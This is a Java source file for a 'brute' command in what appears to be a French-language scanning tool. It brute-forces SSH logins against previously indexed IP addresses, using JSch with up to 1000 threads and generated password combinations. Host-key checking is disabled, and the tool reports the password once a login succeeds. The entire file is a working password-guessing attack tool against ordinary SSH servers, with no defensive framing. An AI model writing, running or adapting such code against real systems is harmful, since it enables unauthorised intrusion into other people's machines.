package fr.guedesite.vinfo.cmd;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

import fr.guedesite.vinfo.main;
import fr.guedesite.vinfo.ssh.ipConnection;
import fr.guedesite.vinfo.utils.bruteUtils;

public class brute extends CMDRunnable{
	
private final int maxThread = 1000;
	
	private static long totalTrait, totaltry;
	private ExecutorService pool;
	
	public static String password = null;
	
	@Override
	public void execute(String[] arg) {
		if(arg.length == 2) {
			totalTrait = 0;
			totaltry = 0;
			int id = 0;
			try {
				id = Integer.parseInt(arg[0]);
			} catch(NumberFormatException e) {
				log("Nombre invalide");
				showHelp();
			}
			if(main.IndexedIp == null) {
				log("Aucune IP indexé");
				log("essayez \"scan\"");
				return;
			}
			if(ipConnection.findId(id) != null) {
				ipConnection con = ipConnection.findId(id);
				log("processus en cours sur "+arg[1]+"@"+con.ip);
				bruteUtils.reset();
				while(password == null) {
					pool= Executors.newFixedThreadPool(maxThread);
					totalTrait++;
					while(password == null & totalTrait % 400000 != 0)  {
						totalTrait++;
						if(password != null) {
							break;
						}
						pool.submit(new tryPass(new String[] { bruteUtils.computeNextCombination(), bruteUtils.computeNextCombination(),bruteUtils.computeNextCombination() }, arg[1], con.ip));
					}
					System.out.println("wait");
					pool.shutdown();
					try {
						while(!pool.isTerminated()) {
							Thread.sleep(1);
						}
						pool.shutdownNow();
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
				log("mot de passe trouvé: \""+password+"\" en "+totaltry+" tentative");
			} else {
				log("brute > Aucune IP avec cette ID trouvé");
			}
		} else {
			showHelp();
		}
	}

	@Override
	public void showHelp() {
		System.out.println("brute (id) (user) (optionnel| log:true/false) ");
	}

	@Override
	public String getDescription() {
		return "brute force le mot de passe d'une connection";
	}
	
	private class tryPass implements Runnable {

		private final String[] pass;
		private String id, ip;
		public tryPass(String[] password, String id, String ip) {
			this.id = id;
			this.ip = ip;
			this.pass = password;
		}
		
		@Override
		public void run() {
			Session session = null;
		    for(String s:pass) {
		    	totaltry++;
		    	if(password != null) {
		    		return;
		    	}
		        try {
					session = new JSch().getSession(this.id, this.ip, 22);
					session.setTimeout(1000);
				} catch (JSchException e1) {
					e1.printStackTrace();
					return;
				}
		        session.setPassword(s);
		        session.setConfig("StrictHostKeyChecking", "no");
		        try {
					session.connect();
				} catch (JSchException e) {

					session.disconnect();
					return;
				}
		        session.disconnect();
		        password = s;
		   
		    }
			
		}
		
	}

}
